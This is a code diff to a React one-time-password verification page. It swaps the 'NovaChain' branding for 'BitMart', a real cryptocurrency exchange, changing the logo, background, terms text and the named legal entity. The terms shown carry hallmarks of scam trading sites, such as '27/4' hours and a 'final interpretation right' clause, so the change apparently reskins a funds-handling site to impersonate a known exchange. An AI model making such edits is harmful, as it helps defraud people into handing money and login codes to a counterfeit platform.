@@ -2,7 +2,7 @@ import React, { useState, useEffect, useRef } from "react";
 import { useNavigate, useLocation, Link } from "react-router-dom";
 import { MAIN_API_BASE } from "../config";
 import Card from "../components/card";
-import NovaChainLogo from "../components/NovaChainLogo.svg";
+import BitMartLogo from "../components/BitMartLogo.png";
 import ReactCodesInput from "react-codes-input";
 
 /* ---------- Inline Terms modal (updated) ---------- */
@@ -25,7 +25,7 @@ function TermsModal({ open, onAgree }) {
 
         <div className="max-h-[60vh] overflow-y-auto px-6 py-5 space-y-4 text-sm leading-6">
           <p>
-            By tapping <b>Agree</b>, you confirm that you have read and accept NovaChain’s
+            By tapping <b>Agree</b>, you confirm that you have read and accept BitMart’s
             Terms &amp; Conditions. Key points:
           </p>
 
@@ -48,7 +48,7 @@ function TermsModal({ open, onAgree }) {
               <b>Funds</b>
               <ul className="list-disc pl-5 mt-1 space-y-1">
                 <li>All funds are processed by the system (no manual operations) to avoid losses.</li>
-                <li>Accidental loss due to <b>NovaChain’s own mistake</b>: the platform takes full responsibility.</li>
+                <li>Accidental loss due to <b>BitMart’s own mistake</b>: the platform takes full responsibility.</li>
               </ul>
             </li>
 
@@ -76,7 +76,7 @@ function TermsModal({ open, onAgree }) {
                 <li>Platform opening hours: <b>27/4</b>.</li>
                 <li>Online customer service: <b>10:00–22:00</b>.</li>
                 <li>Withdrawal time: <b>09:00–22:00</b> (UTC-4).</li>
-                <li>Final interpretation right belongs to <b>Novachain LTD</b>.</li>
+                <li>Final interpretation right belongs to <b>BitMart LTD</b>.</li>
               </ul>
             </li>
           </ol>
@@ -199,7 +199,7 @@ export default function VerifyOTPPage() {
     <div
       className="min-h-screen w-full flex items-center justify-center relative px-2 py-4"
       style={{
-        backgroundImage: 'url("/novachain.jpg")',
+        backgroundImage: 'url("/bitmart.jpg")',
         backgroundSize: "cover",
         backgroundPosition: "center",
         backgroundRepeat: "no-repeat",
@@ -223,8 +223,8 @@ export default function VerifyOTPPage() {
         >
           <div className="flex items-center justify-center w-full mb-6 mt-[-10px]">
             <img
-              src={NovaChainLogo}
-              alt="NovaChain Logo"
+              src={BitMartLogo}
+              alt="BitMart Logo"
               className="block select-none pointer-events-none"
               style={{
                 width: "88%",
@@ -375,7 +375,7 @@ export default function VerifyOTPPage() {
           .responsive-button { max-width: 200px !important; font-size: 1rem !important; }
         }
         @keyframes logoGlow { 0% { filter: drop-shadow(0 0 16px #00eaff99); } 48% { filter: drop-shadow(0 0 52px #00eaff66); } 100% { filter: drop-shadow(0 0 16px #00eaff99); } }
-        img[alt="NovaChain Logo"] { animation: logoGlow 2.8s ease-in-out infinite alternate; }
+        img[alt="BitMart Logo"] { animation: logoGlow 2.8s ease-in-out infinite alternate; }
         `}
       </style>
 
